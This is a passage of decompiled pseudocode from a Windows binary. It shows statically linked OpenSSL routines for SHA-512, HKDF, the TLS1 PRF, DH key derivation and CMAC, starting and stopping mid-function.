                      + ((DWORD2(v873[1]) << 23) ^ (DWORD2(v873[1]) >> 18) ^ (HIDWORD(v873[1]) << 18) ^ (DWORD2(v873[1]) >> 14) ^ (HIDWORD(v873[1]) << 14) ^ (HIDWORD(v873[1]) >> 9));
        LODWORD(v795) = DWORD2(v873[2]) ^ DWORD2(v873[1]) & (DWORD2(v873[2]) ^ LODWORD(v873[2]));
        HIDWORD(v796) = HIDWORD(v873[2]) ^ HIDWORD(v873[1]) & (HIDWORD(v873[2]) ^ DWORD1(v873[2]));
        v797 = v795 + v796;
        HIDWORD(v796) = DWORD1(v873[1]);
        LODWORD(v795) = v873[1];
        HIDWORD(v795) = (unsigned __int64)(v2->m128i_i64[0] + v797) >> 32;
        LODWORD(v796) = v2->m128i_i32[0] + v797;
        *(_QWORD *)&v873[1] = v795 + v796;
        HIDWORD(v795) = (__PAIR64__(HIDWORD(v795), v796)
                       + __PAIR64__(
                           (HIDWORD(v872) << 30) ^ (HIDWORD(v872) >> 28) ^ (HIDWORD(v872) << 25) ^ ((unsigned int)v872 >> 7) ^ (16 * v872) ^ ((unsigned int)v872 >> 2),
                           ((_DWORD)v872 << 30) ^ ((unsigned int)v872 >> 28) ^ ((_DWORD)v872 << 25) ^ (HIDWORD(v872) >> 7) ^ (16 * HIDWORD(v872)) ^ (HIDWORD(v872) >> 2))) >> 32;
        LODWORD(v796) = v796
                      + (((_DWORD)v872 << 30) ^ ((unsigned int)v872 >> 28) ^ ((_DWORD)v872 << 25) ^ (HIDWORD(v872) >> 7) ^ (16 * HIDWORD(v872)) ^ (HIDWORD(v872) >> 2));
        LODWORD(v795) = v872 & LODWORD(v873[0]) | DWORD2(v873[0]) & (LODWORD(v873[0]) | v872);
        HIDWORD(v796) = HIDWORD(v872) & DWORD1(v873[0]) | HIDWORD(v873[0]) & (DWORD1(v873[0]) | HIDWORD(v872));
        v863 = v795 + v796;
        BYTE4(v796) = v2->m128i_i8[0];
        v2 = (const __m128i *)((char *)v2 + 8);
      }
      while ( BYTE4(v796) != 23 );
      v0 = v896;
      v1 = v897;
      v798 = v896[1].m64_i32[0];
      v799 = v896[1].m64_i32[1];
      v896->m64_u64 += v863;
      v0[1].m64_u64 = v872 + __PAIR64__(v799, v798);
      v800 = v0[3].m64_i32[0];
      v801 = v0[3].m64_i32[1];
      v0[2].m64_u64 += *(_QWORD *)&v873[0];
      v0[3].m64_u64 = *((_QWORD *)&v873[0] + 1) + __PAIR64__(v801, v800);
      v802 = v0[5].m64_i32[0];
      v803 = v0[5].m64_i32[1];
      v0[4].m64_u64 += *(_QWORD *)&v873[1];
      v0[5].m64_u64 = *((_QWORD *)&v873[1] + 1) + __PAIR64__(v803, v802);
      v804 = v0[7].m64_i32[0];
      v805 = v0[7].m64_i32[1];
      v806 = *(_QWORD *)&v873[2] + v0[6].m64_u64;
      result = v806;
      v0[6].m64_u64 = v806;
      v0[7].m64_u64 = *((_QWORD *)&v873[2] + 1) + __PAIR64__(v805, v804);
      v2 -= 40;
    }
    while ( (unsigned int)v1 < (unsigned int)v898 );
  }
  return result;
}
// 465332: positive sp value 260 has been found
// 465340: using guessed type int SHA512_Constants_465340[163];
// 73C6D0: using guessed type int dword_73C6D0;

//----- (00465650) --------------------------------------------------------
void __cdecl sub_465650(int a1)
{
  int v1; // esi

  v1 = *(_DWORD *)(a1 + 20);
  sub_4134B0(*(_BYTE **)(v1 + 4), *(_DWORD *)(v1 + 8));
  sub_4134B0(*(_BYTE **)(v1 + 12), *(_DWORD *)(v1 + 16));
  sub_4139E0((_BYTE *)(v1 + 20), *(_DWORD *)(v1 + 1044));
  sub_413490((void *)v1);
}

//----- (004656B0) --------------------------------------------------------
int __cdecl sub_4656B0(int a1, int a2, int Size, void *Src)
{
  _DWORD *v4; // esi
  int result; // eax
  _BYTE *v6; // eax
  void *v7; // eax
  _BYTE *v8; // eax
  void *v9; // eax
  int v10; // eax

  v4 = *(_DWORD **)(a1 + 20);
  switch ( a2 )
  {
    case 4099:
      if ( !Src )
        goto LABEL_3;
      *v4 = Src;
      goto LABEL_5;
    case 4100:
      if ( !Size || !Src )
        goto LABEL_14;
      if ( Size < 0 )
        goto LABEL_12;
      v6 = (_BYTE *)v4[1];
      if ( v6 )
        sub_4134B0(v6, v4[2]);
      v7 = sub_424800(Src, Size);
      v4[1] = v7;
      if ( v7 )
      {
        v4[2] = Size;
LABEL_14:
        result = 1;
      }
      else
      {
LABEL_12:
        result = 0;
      }
      break;
    case 4101:
      if ( Size < 0 )
        goto LABEL_3;
      v8 = (_BYTE *)v4[3];
      if ( v8 )
        sub_4134B0(v8, v4[4]);
      v9 = sub_424800(Src, Size);
      v4[3] = v9;
      if ( !v9 )
        goto LABEL_3;
      v4[4] = Size;
      result = 1;
      break;
    case 4102:
      if ( Size && Src )
      {
        if ( Size < 0 || (v10 = v4[261], Size > 1024 - v10) )
        {
LABEL_3:
          result = 0;
        }
        else
        {
          memcpy((char *)v4 + v10 + 20, Src, Size);
          v4[261] += Size;
          result = 1;
        }
      }
      else
      {
LABEL_5:
        result = 1;
      }
      break;
    default:
      return -2;
  }
  return result;
}

//----- (00465800) --------------------------------------------------------
int __cdecl sub_465800(int a1, const char *a2, const char *a3)
{
  int v3; // eax

  if ( !strcmp(a2, "md") )
  {
    v3 = sub_430D80((int)a3);
    return sub_443A60(a1, -1, 1024, 4099, 0, v3);
  }
  else if ( !strcmp(a2, "salt") )
  {
    return sub_443B50(a1, 4100, a3);
  }
  else if ( !strcmp(a2, "hexsalt") )
  {
    return (int)sub_443B90(a1, 4100, a3);
  }
  else if ( !strcmp(a2, "key") )
  {
    return sub_443B50(a1, 4101, a3);
  }
  else if ( !strcmp(a2, "hexkey") )
  {
    return (int)sub_443B90(a1, 4101, a3);
  }
  else if ( !strcmp(a2, "info") )
  {
    return sub_443B50(a1, 4102, a3);
  }
  else if ( !strcmp(a2, "hexinfo") )
  {
    return (int)sub_443B90(a1, 4102, a3);
  }
  else
  {
    return -2;
  }
}

//----- (004659E0) --------------------------------------------------------
int __fastcall sub_4659E0(int a1, int *a2, void *a3, int Size, int a5, int a6, unsigned int a7)
{
  int v8; // edi
  unsigned int v9; // ebp
  unsigned int v10; // eax
  int **v11; // eax
  unsigned int v12; // ebx
  int **v13; // esi
  size_t v14; // esi
  int **Block; // [esp+14h] [ebp-54h]
  unsigned int v17; // [esp+18h] [ebp-50h]
  char Src[64]; // [esp+24h] [ebp-44h] BYREF

  v8 = 0;
  v9 = sub_407480((int)a2);
  v10 = a7 / v9;
  v17 = a7 / v9;
  if ( a7 % v9 )
    v17 = ++v10;
  if ( v10 <= 0xFF )
  {
    v11 = (int **)sub_4CB050();
    Block = v11;
    if ( v11 )
    {
      if ( sub_4CAB30(v11, a3, Size, a2, 0) )
      {
        v12 = 1;
        if ( !v17 )
        {
LABEL_17:
          sub_4CAE30((_BYTE **)Block);
          return a1;
        }
        while ( 1 )
        {
          v13 = Block;
          if ( v12 > 1 && (!sub_4CAB30(Block, 0, 0, 0, 0) || !sub_4CAD60(Block)) )
            break;
          if ( !sub_4CAD60(Block) || !sub_4CAD60(Block) || !sub_4CAD80(Block, (int)Src, 0) )
            break;
          if ( v8 + v9 <= a7 )
            v14 = v9;
          else
            v14 = a7 - v8;
          memcpy((void *)(v8 + a1), Src, v14);
          ++v12;
          v8 += v14;
          if ( v12 > v17 )
            goto LABEL_17;
        }
      }
      else
      {
        v13 = Block;
      }
      sub_4CAE30((_BYTE **)v13);
    }
  }
  return 0;
}

//----- (00465B70) --------------------------------------------------------
void *__usercall sub_465B70@<eax>(
        int a1@<ecx>,
        int a2@<ebx>,
        int a3@<edi>,
        int *a4@<esi>,
        void *Src,
        int Size,
        int a7,
        int a8,
        unsigned int a9)
{
  void *result; // eax
  int v10; // [esp+0h] [ebp-48h] BYREF
  int v11[16]; // [esp+4h] [ebp-44h] BYREF

  result = sub_4CB090(a4, Src, Size, a1, a7, v11, &v10);
  if ( result )
    return (void *)sub_4659E0(a2, a4, v11, v10, a3, a8, a9);
  return result;
}

//----- (00465BF0) --------------------------------------------------------
BOOL __cdecl sub_465BF0(int a1, int a2, unsigned int *a3)
{
  int v3; // eax
  int v4; // ecx

  v3 = *(_DWORD *)(a1 + 20);
  return *(_DWORD *)v3
      && (v4 = *(_DWORD *)(v3 + 12)) != 0
      && sub_465B70(
           v4,
           a2,
           v3 + 20,
           *(int **)v3,
           *(void **)(v3 + 4),
           *(_DWORD *)(v3 + 8),
           *(_DWORD *)(v3 + 16),
           *(_DWORD *)(v3 + 1044),
           *a3) != 0;
}

//----- (00465C40) --------------------------------------------------------
int __cdecl sub_465C40(int a1)
{
  int result; // eax

  result = (int)sub_413430(0x410u);
  if ( result )
  {
    *(_DWORD *)(a1 + 20) = result;
    return 1;
  }
  return result;
}

//----- (00465C70) --------------------------------------------------------
void __cdecl sub_465C70(int a1)
{
  int v1; // esi

  v1 = *(_DWORD *)(a1 + 20);
  sub_4134B0(*(_BYTE **)(v1 + 4), *(_DWORD *)(v1 + 8));
  sub_4139E0((_BYTE *)(v1 + 12), *(_DWORD *)(v1 + 1036));
  sub_413490((void *)v1);
}

//----- (00465CB0) --------------------------------------------------------
int __cdecl sub_465CB0(int a1, int a2, int Size, void *Src)
{
  int v4; // esi
  int v6; // eax
  _BYTE *v7; // eax
  void *v8; // eax

  v4 = *(_DWORD *)(a1 + 20);
  switch ( a2 )
  {
    case 4096:
      *(_DWORD *)v4 = Src;
      return 1;
    case 4097:
      if ( Size < 0 )
        return 0;
      v7 = *(_BYTE **)(v4 + 4);
      if ( v7 )
        sub_4134B0(v7, *(_DWORD *)(v4 + 8));
      sub_4139E0((_BYTE *)(v4 + 12), *(_DWORD *)(v4 + 1036));
      *(_DWORD *)(v4 + 1036) = 0;
      v8 = sub_424800(Src, Size);
      *(_DWORD *)(v4 + 4) = v8;
      if ( !v8 )
        return 0;
      *(_DWORD *)(v4 + 8) = Size;
      return 1;
    case 4098:
      if ( !Size || !Src )
        return 1;
      if ( Size >= 0 )
      {
        v6 = *(_DWORD *)(v4 + 1036);
        if ( Size <= 1024 - v6 )
        {
          memcpy((void *)(v6 + v4 + 12), Src, Size);
          *(_DWORD *)(v4 + 1036) += Size;
          return 1;
        }
      }
      return 0;
    default:
      return -2;
  }
}

//----- (00465DA0) --------------------------------------------------------
int __cdecl sub_465DA0(int a1, const char *a2, const char *a3)
{
  int *v4; // esi
  int v5; // eax

  if ( a3 )
  {
    if ( !strcmp(a2, "md") )
    {
      v4 = *(int **)(a1 + 20);
      v5 = sub_430D80((int)a3);
      if ( v5 )
      {
        *v4 = v5;
        return 1;
      }
      else
      {
        sub_408310(52, 100, 100, (int)"crypto\\kdf\\tls1_prf.c", 104);
        return 0;
      }
    }
    else if ( !strcmp(a2, "secret") )
    {
      return sub_443B50(a1, 4097, a3);
    }
    else if ( !strcmp(a2, "hexsecret") )
    {
      return (int)sub_443B90(a1, 4097, a3);
    }
    else if ( !strcmp(a2, "seed") )
    {
      return sub_443B50(a1, 4098, a3);
    }
    else if ( !strcmp(a2, "hexseed") )
    {
      return (int)sub_443B90(a1, 4098, a3);
    }
    else
    {
      return -2;
    }
  }
  else
  {
    sub_408310(52, 100, 102, (int)"crypto\\kdf\\tls1_prf.c", 96);
    return 0;
  }
}

//----- (00465F60) --------------------------------------------------------
int __fastcall sub_465F60(char *a1, int *a2, int a3, int a4, int a5, int a6, size_t Size)
{
  int v8; // ebp
  _BYTE *v9; // edi
  _BYTE *v10; // eax
  int *v11; // eax
  unsigned int v12; // ebx
  _BYTE *v14; // [esp+10h] [ebp-60h]
  _BYTE *v16; // [esp+18h] [ebp-58h]
  unsigned int v17; // [esp+1Ch] [ebp-54h] BYREF
  int v18; // [esp+20h] [ebp-50h] BYREF
  int v19; // [esp+24h] [ebp-4Ch]
  void *Block; // [esp+28h] [ebp-48h]
  char Src[64]; // [esp+2Ch] [ebp-44h] BYREF

  v18 = a5;
  Block = 0;
  v19 = 0;
  v8 = sub_407480((int)a2);
  if ( v8 < 0 )
    sub_417C70("assertion failed: chunk >= 0", "crypto\\kdf\\tls1_prf.c", 177);
  v9 = sub_42B820();
  v16 = sub_42B820();
  v10 = sub_42B820();
  v14 = v10;
  if ( v9 )
  {
    if ( v16 )
    {
      if ( v10 )
      {
        sub_407590((int)v10, 8);
        v11 = sub_4CB2C0(855, 0, a3, a4);
        Block = v11;
        if ( v11 )
        {
          if ( sub_44FE10((int)v14, 0, a2, 0, (int)v11) )
          {
            if ( sub_42BAA0((int)v9, (int)v14) )
            {
              v12 = v18;
              if ( (!v18 || sub_42BA10((int)v9)) && sub_44FE70((int)v9, (int)Src, &v17) && sub_42BAA0((int)v9, (int)v14) )
              {
                while ( sub_42BA10((int)v9)
                     && (Size <= v8 || sub_42BAA0((int)v16, (int)v9))
                     && (!v12 || sub_42BA10((int)v9)) )
                {
                  if ( Size <= v8 )
                  {
                    if ( sub_44FE70((int)v9, (int)Src, &v17) )
                    {
                      memcpy(a1, Src, Size);
                      v19 = 1;
                    }
                    break;
                  }
                  if ( sub_44FE70((int)v9, (int)a1, (unsigned int *)&v18) )
                  {
                    a1 += v18;
                    Size -= v18;
                    if ( sub_44FE70((int)v16, (int)Src, &v17) )
                    {
                      if ( sub_42BAA0((int)v9, (int)v14) )
                        continue;
                    }
                  }
                  break;
                }
              }
            }
          }
        }
      }
    }
  }
  sub_41CEB0((volatile LONG *)Block);
  sub_42B840(v9);
  sub_42B840(v16);
  sub_42B840(v14);
  sub_4139E0(Src, 0x40u);
  return v19;
}

//----- (004661E0) --------------------------------------------------------
BOOL __usercall sub_4661E0@<eax>(
        unsigned int a1@<ecx>,
        int *a2@<edx>,
        size_t a3@<edi>,
        int a4,
        int a5,
        int a6,
        char *a7)
{
  unsigned int v9; // ebx
  int v10; // ebp
  int *v11; // eax
  char *v12; // esi
  int *v13; // eax
  char *v15; // eax
  size_t v16; // ebp

  if ( sub_435D30((int)a2) != 114 )
    return sub_465F60(a7, a2, a4, a1, a5, a6, a3) != 0;
  v9 = a1 >> 1;
  v10 = (a1 & 1) + (a1 >> 1);
  v11 = (int *)sub_4303E0();
  if ( !sub_465F60(a7, v11, a4, v10, a5, a6, a3) )
    return 0;
  v12 = (char *)sub_4133F0(a3);
  if ( !v12 )
    return 0;
  v13 = (int *)sub_42BEA0();
  if ( !sub_465F60(v12, v13, a4 + v9, v10, a5, a6, a3) )
  {
    sub_4134B0(v12, a3);
    return 0;
  }
  if ( a3 )
  {
    v15 = a7;
    v16 = a3;
    do
    {
      *v15 ^= v15[v12 - a7];
      ++v15;
      --v16;
    }
    while ( v16 );
  }
  sub_4134B0(v12, a3);
  return 1;
}

//----- (004662E0) --------------------------------------------------------
BOOL __cdecl sub_4662E0(int a1, char *a2, size_t *a3)
{
  int v3; // eax
  int v4; // esi
  int v5; // ecx

  v3 = *(_DWORD *)(a1 + 20);
  if ( *(_DWORD *)v3 )
  {
    v4 = *(_DWORD *)(v3 + 4);
    if ( v4 )
    {
      v5 = *(_DWORD *)(v3 + 1036);
      if ( v5 )
        return sub_4661E0(*(_DWORD *)(v3 + 8), *(int **)v3, *a3, v4, v3 + 12, v5, a2);
    }
  }
  sub_408310(52, 101, 101, (int)"crypto\\kdf\\tls1_prf.c", 126);
  return 0;
}

//----- (00466340) --------------------------------------------------------
int __cdecl sub_466340(_DWORD *a1)
{
  int result; // eax

  result = (int)sub_413430(0x38u);
  if ( result )
  {
    *(_DWORD *)result = 1024;
    *(_DWORD *)(result + 12) = -1;
    *(_DWORD *)(result + 4) = 2;
    *(_BYTE *)(result + 32) = 1;
    a1[5] = result;
    a1[8] = result + 24;
    a1[9] = 2;
    return 1;
  }
  return result;
}

//----- (00466390) --------------------------------------------------------
void __cdecl sub_466390(int a1)
{
  int v1; // esi

  v1 = *(_DWORD *)(a1 + 20);
  if ( v1 )
  {
    sub_413490(*(void **)(v1 + 44));
    sub_422B70(*(void ***)(v1 + 36));
    sub_413490((void *)v1);
  }
}

//----- (004663D0) --------------------------------------------------------
int __cdecl sub_4663D0(_DWORD *a1, int a2)
{
  _DWORD *v2; // esi
  int v3; // edi
  void **v4; // eax
  void *v5; // eax
  void *v6; // eax

  v2 = sub_413430(0x38u);
  if ( !v2 )
    return 0;
  *v2 = 1024;
  v2[3] = -1;
  *((_BYTE *)v2 + 32) = 1;
  v2[1] = 2;
  a1[5] = v2;
  a1[9] = 2;
  a1[8] = v2 + 6;
  v3 = *(_DWORD *)(a2 + 20);
  *v2 = *(_DWORD *)v3;
  v2[3] = *(_DWORD *)(v3 + 12);
  v2[1] = *(_DWORD *)(v3 + 4);
  v2[2] = *(_DWORD *)(v3 + 8);
  v2[4] = *(_DWORD *)(v3 + 16);
  v2[5] = *(_DWORD *)(v3 + 20);
  *((_BYTE *)v2 + 32) = *(_BYTE *)(v3 + 32);
  v4 = sub_439EE0(*(_DWORD *)(v3 + 36));
  v2[9] = v4;
  if ( !v4 )
    return 0;
  v2[10] = *(_DWORD *)(v3 + 40);
  v5 = *(void **)(v3 + 44);
  if ( v5 )
  {
    v6 = sub_424800(v5, *(_DWORD *)(v3 + 48));
    v2[11] = v6;
    if ( !v6 )
      return 0;
    v2[12] = *(_DWORD *)(v3 + 48);
  }
  v2[13] = *(_DWORD *)(v3 + 52);
  return 1;
}

//----- (004664A0) --------------------------------------------------------
int __cdecl sub_4664A0(int a1, int a2, int a3, _DWORD *a4)
{
  int v4; // esi
  int result; // eax

  v4 = *(_DWORD *)(a1 + 20);
  if ( a2 > 4097 )
  {
    switch ( a2 )
    {
      case 4098:
        if ( *(_DWORD *)(v4 + 8) )
          return -2;
        *(_DWORD *)(v4 + 4) = a3;
        return 1;
      case 4099:
        if ( (unsigned int)(a3 - 1) > 2 )
          return -2;
        *(_DWORD *)(v4 + 20) = a3;
        return 1;
      case 4100:
        if ( !*(_DWORD *)(v4 + 8) )
          return -2;
        *(_DWORD *)(v4 + 12) = a3;
        return 1;
      case 4101:
        if ( (unsigned int)a3 > 2 )
          return -2;
        *(_DWORD *)(v4 + 8) = a3;
        return 1;
      case 4102:
        if ( a3 == -2 )
          return *(char *)(v4 + 32);
        if ( a3 != 1 && a3 != 2 )
          return -2;
        *(_BYTE *)(v4 + 32) = a3;
        result = 1;
        break;
      case 4103:
        *(_DWORD *)(v4 + 40) = a4;
        return 1;
      case 4104:
        *a4 = *(_DWORD *)(v4 + 40);
        return 1;
      case 4105:
        if ( a3 <= 0 )
          return -2;
        *(_DWORD *)(v4 + 52) = a3;
        return 1;
      case 4106:
        *a4 = *(_DWORD *)(v4 + 52);
        return 1;
      case 4107:
        sub_413490(*(void **)(v4 + 44));
        *(_DWORD *)(v4 + 44) = a4;
        *(_DWORD *)(v4 + 48) = a4 != 0 ? a3 : 0;
        return 1;
      case 4108:
        *a4 = *(_DWORD *)(v4 + 44);
        return *(_DWORD *)(v4 + 48);
      case 4109:
        sub_422B70(*(void ***)(v4 + 36));
        *(_DWORD *)(v4 + 36) = a4;
        return 1;
      case 4110:
        *a4 = *(_DWORD *)(v4 + 36);
        return 1;
      default:
        return -2;
    }
  }
  else
  {
    if ( a2 == 4097 )
    {
      if ( a3 >= 256 )
      {
        *(_DWORD *)v4 = a3;
        return 1;
      }
    }
    else if ( a2 == 2 )
    {
      return 1;
    }
    return -2;
  }
  return result;
}

//----- (00466660) --------------------------------------------------------
int __cdecl sub_466660(int a1, const char *a2, char *String)
{
  int v3; // eax
  int v5; // esi
  unsigned int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax

  if ( !strcmp(a2, "dh_paramgen_prime_len") )
  {
    v3 = atoi(String);
    return sub_443A60(a1, 28, 2, 4097, v3, 0);
  }
  if ( !strcmp(a2, "dh_rfc5114") )
  {
    v5 = *(_DWORD *)(a1 + 20);
    v6 = atoi(String);
    if ( v6 <= 3 )
    {
      *(_DWORD *)(v5 + 20) = v6;
      return 1;
    }
  }
  else
  {
    if ( !strcmp(a2, "dh_paramgen_generator") )
    {
      v7 = atoi(String);
      return sub_443A60(a1, 28, 2, 4098, v7, 0);
    }
    if ( !strcmp(a2, "dh_paramgen_subprime_len") )
    {
      v8 = atoi(String);
      return sub_443A60(a1, 28, 2, 4100, v8, 0);
    }
    if ( !strcmp(a2, "dh_paramgen_type") )
    {
      v9 = atoi(String);
      return sub_443A60(a1, 28, 2, 4101, v9, 0);
    }
  }
  return -2;
}

//----- (00466830) --------------------------------------------------------
volatile LONG *__usercall sub_466830@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3)
{
  int *v4; // ebx
  unsigned int v5; // esi
  int v6; // edi
  volatile LONG *result; // eax
  int *v8; // eax
  int v9; // ebp
  int v10; // eax
  bool v11; // cc
  volatile LONG *v12; // [esp+14h] [ebp+4h]

  v4 = (int *)a2[4];
  v5 = a2[3];
  v6 = *a2;
  if ( a2[2] > 2 )
    return 0;
  result = (volatile LONG *)sub_41DAF0();
  v12 = result;
  if ( !result )
    return 0;
  if ( v5 == -1 )
    v5 = v6 < 2048 ? 160 : 256;
  if ( !v4 )
  {
    if ( v6 < 2048 )
      v8 = (int *)sub_42BEA0();
    else
      v8 = (int *)sub_42BF50();
    v4 = v8;
    result = v12;
  }
  v9 = a2[2];
  if ( v9 == 1 )
  {
    v10 = sub_4CB340(a1, (int)result, v6, v5, v4, 0, 0, 0, 0, 0, a3);
    goto LABEL_14;
  }
  if ( v9 == 2 )
  {
    v10 = sub_4CBA40(a1, (int)result, v6, v5, v4, 0, 0, -1, 0, 0, 0, a3);
LABEL_14:
    v11 = v10 <= 0;
    result = v12;
    if ( !v11 )
      return result;
  }
  sub_41D610(result);
  return 0;
}

//----- (00466900) --------------------------------------------------------
int __usercall sub_466900@<eax>(__m64 a1@<mm0>, int a2, int a3)
{
  int *v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // esi
  int *v11; // edi
  volatile LONG *v12; // esi
  volatile LONG *v13; // ebx
  int v14; // edi

  v3 = *(int **)(a2 + 20);
  v4 = v3[5];
  if ( !v4 )
  {
    if ( *(_DWORD *)(a2 + 28) )
    {
      v9 = sub_416EC0();
      v10 = v9;
      if ( !v9 )
        return 0;
      sub_4CB2A0(v9, a2);
    }
    else
    {
      v10 = 0;
    }
    if ( v3[2] )
    {
      v11 = (int *)sub_466830(a1, v3, v10);
      sub_416F00(v10);
      if ( v11 )
      {
        v12 = sub_41D770(v11);
        sub_41D610(v11);
        if ( v12 )
        {
          sub_41CE20(a3, (void *)0x398, (int)v12);
          return 1;
        }
      }
    }
    else
    {
      v13 = (volatile LONG *)sub_4349A0();
      if ( v13 )
      {
        v14 = sub_4CC4E0(a1, (int)v13, *v3, v3[1], v10);
        sub_416F00(v10);
        if ( v14 )
        {
          sub_41CE20(a3, (void *)0x1C, (int)v13);
          return v14;
        }
        else
        {
          sub_4346C0(v13);
          return 0;
        }
      }
      sub_416F00(v10);
    }
    return 0;
  }
  v5 = v4 - 1;
  if ( v5 )
  {
    v6 = v5 - 1;
    if ( v6 )
    {
      if ( v6 != 1 )
        return -2;
      v8 = sub_4CC5C0();
    }
    else
    {
      v8 = sub_4CC560();
    }
  }
  else
  {
    v8 = sub_4CC500();
  }
  sub_41CE20(a3, (void *)0x398, v8);
  return 1;
}

//----- (00466A20) --------------------------------------------------------
int __cdecl sub_466A20(int a1, _DWORD *a2)
{
  int result; // eax
  int v3; // eax

  if ( !*(_DWORD *)(a1 + 8) )
  {
    sub_408310(5, 113, 107, (int)"crypto\\dh\\dh_pmeth.c", 364);
    return 0;
  }
  v3 = sub_4349A0();
  if ( !v3 )
    return 0;
  sub_41CE20((int)a2, **(void ***)a1, v3);
  result = sub_41CF00(a2, *(_DWORD *)(a1 + 8));
  if ( result )
    return sub_4559C0(a2[5]);
  return result;
}

//----- (00466A90) --------------------------------------------------------
int __cdecl sub_466A90(_DWORD *a1, char *a2, size_t *a3)
{
  int v3; // eax
  int v4; // esi
  int v5; // ecx
  int v6; // ebp
  int v7; // ecx
  char v8; // al
  int v9; // eax
  int result; // eax
  int v11; // ebx
  char *v12; // edi
  int v13; // esi
  int v14; // [esp+Ch] [ebp+4h]

  v3 = a1[2];
  v4 = a1[5];
  if ( !v3 || (v5 = a1[3]) == 0 )
  {
    sub_408310(5, 112, 108, (int)"crypto\\dh\\dh_pmeth.c", 385);
    return 0;
  }
  v6 = *(_DWORD *)(v3 + 20);
  v7 = *(_DWORD *)(*(_DWORD *)(v5 + 20) + 20);
  v8 = *(_BYTE *)(v4 + 32);
  v14 = v7;
  if ( v8 == 1 )
  {
    if ( !a2 )
    {
      v9 = sub_434790(v6);
LABEL_6:
      *a3 = v9;
      return 1;
    }
    result = sub_4559D0((int)a2, v7, v6);
    if ( result >= 0 )
    {
      *a3 = result;
      return 1;
    }
  }
  else
  {
    if ( v8 != 2 )
      return 0;
    v9 = *(_DWORD *)(v4 + 52);
    if ( !v9 || !*(_DWORD *)(v4 + 36) )
      return 0;
    if ( !a2 )
      goto LABEL_6;
    if ( *a3 != v9 )
      return 0;
    v11 = sub_434790(v6);
    v12 = (char *)sub_4133F0(v11);
    if ( v12
      && sub_4559E0(v12, v14, v6) > 0
      && sub_4CC7B0(
           a2,
           *a3,
           (int)v12,
           v11,
           *(_DWORD *)(v4 + 36),
           *(char **)(v4 + 44),
           *(_DWORD *)(v4 + 48),
           *(int **)(v4 + 40)) )
    {
      *a3 = *(_DWORD *)(v4 + 52);
      v13 = 1;
    }
    else
    {
      v13 = 0;
    }
    sub_4134B0(v12, v11);
    return v13;
  }
  return result;
}

//----- (00466C00) --------------------------------------------------------
int __cdecl sub_466C00(int a1)
{
  int result; // eax

  result = (int)sub_478CC0();
  *(_DWORD *)(a1 + 20) = result;
  if ( result )
  {
    *(_DWORD *)(a1 + 36) = 0;
    return 1;
  }
  return result;
}

//----- (00466C20) --------------------------------------------------------
BOOL __cdecl sub_466C20(int a1, int a2)
{
  _DWORD *v2; // eax

  v2 = sub_478CC0();
  *(_DWORD *)(a1 + 20) = v2;
  if ( !v2 )
    return 0;
  *(_DWORD *)(a1 + 36) = 0;
  return sub_478D90((int)v2, *(int **)(a2 + 20)) != 0;
}

//----- (00466C60) --------------------------------------------------------
void __cdecl sub_466C60(void **Block)
{
  sub_478D60(Block[5]);
}

//----- (00466C70) --------------------------------------------------------
int __cdecl sub_466C70(int a1, int a2)
{
  _DWORD *v2; // esi

  v2 = sub_478CC0();
  if ( !v2 )
    return 0;
  if ( !sub_478D90((int)v2, *(int **)(a1 + 20)) )
  {
    sub_478D60(v2);
    return 0;
  }
  sub_41CE20(a2, (void *)0x37E, (int)v2);
  return 1;
}

//----- (00466CC0) --------------------------------------------------------
BOOL __cdecl sub_466CC0(FILE *Stream, char *Src, size_t Size)
{
  int v3; // eax

  v3 = _fileno(Stream);
  return sub_478F90(*(int **)(v3 + 20), Src, Size) != 0;
}

//----- (00466CF0) --------------------------------------------------------
int __cdecl sub_466CF0(int a1, struct std::ios_base *a2)
{
  sub_407590((int)a2, 256);
  std::spfun(a2, (int)sub_466CC0);
  return 1;
}

//----- (00466D20) --------------------------------------------------------
int __cdecl sub_466D20(int a1, _BYTE *a2, int *a3)
{
  return sub_479070(*(int **)(a1 + 20), a2, a3);
}

//----- (00466D40) --------------------------------------------------------
int __cdecl sub_466D40(int a1, int a2, int a3, int *a4)
{
  char *v4; // esi
  int v6; // eax
  int v7; // ecx

  v4 = *(char **)(a1 + 20);
  switch ( a2 )
  {
    case 1:
      v7 = *(_DWORD *)(a1 + 8);
      if ( v7 && !sub_478D90((int)v4, *(int **)(v7 + 20)) )
        return 0;
      v6 = sub_478E20(v4, 0, 0, 0, 0);
      break;
    case 6:
      if ( !a4 || a3 < 0 )
        return 0;
      v6 = sub_478E20(v4, (int)a4, a3, 0, 0);
      break;
    case 12:
      v6 = sub_478E20(v4, 0, 0, a4, *(int **)(a1 + 4));
      break;
    default:
      return -2;
  }
  return v6 != 0;
}

//----- (00466DD0) --------------------------------------------------------
int __cdecl sub_466DD0(int a1, const char *a2, const char *a3)
{
  int result; // eax

  if ( !a3 )
    return 0;
  if ( !strcmp(a2, "cipher") )
  {
    result = sub_430D50((int)a3);
    if ( result )
      return sub_478E20(*(char **)(a1 + 20), 0, 0, (int *)result, *(int **)(a1 + 4)) != 0;
  }
  else if ( !strcmp(a2, "key") )
  {
    return sub_443B50(a1, 6, a3);
  }
  else if ( !strcmp(a2, "hexkey") )
  {
    return (int)sub_443B90(a1, 6, a3);
  }
  else
  {
    return -2;
  }
  return result;
}

//----- (00466EE0) --------------------------------------------------------
int __cdecl sub_466EE0(int a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // esi
  _BYTE **v3; // eax

  v1 = sub_413430(0x18u);
  v2 = v1;
  if ( !v1 )
    return 0;
  v1[2] = 4;
  v3 = sub_4CB050();
  v2[5] = v3;
  if ( !v3 )
  {
    sub_413490(v2);
    return 0;
  }
  *(_DWORD *)(a1 + 20) = v2;
  *(_DWORD *)(a1 + 36) = 0;
  return 1;
}

//----- (00466F40) --------------------------------------------------------
void __cdecl sub_466F40(struct std::ios_base *a1)
{
  int v1; // esi

  v1 = sub_457690((int)a1);
  if ( v1 )
  {
    sub_4CAE30(*(_BYTE ***)(v1 + 20));
    sub_4134B0(*(_BYTE **)(v1 + 12), *(_DWORD *)(v1 + 4));
    sub_413490((void *)v1);
    std::spfun(a1, 0);
  }
}

//----- (00466F90) --------------------------------------------------------
int __cdecl sub_466F90(int a1, int a2)
{
  int v2; // eax
  void **v4; // eax

  v2 = *(_DWORD *)(a1 + 20);
  if ( !*(_DWORD *)(v2 + 12) )
    return 0;
  v4 = sub_4379F0(v2 + 4);
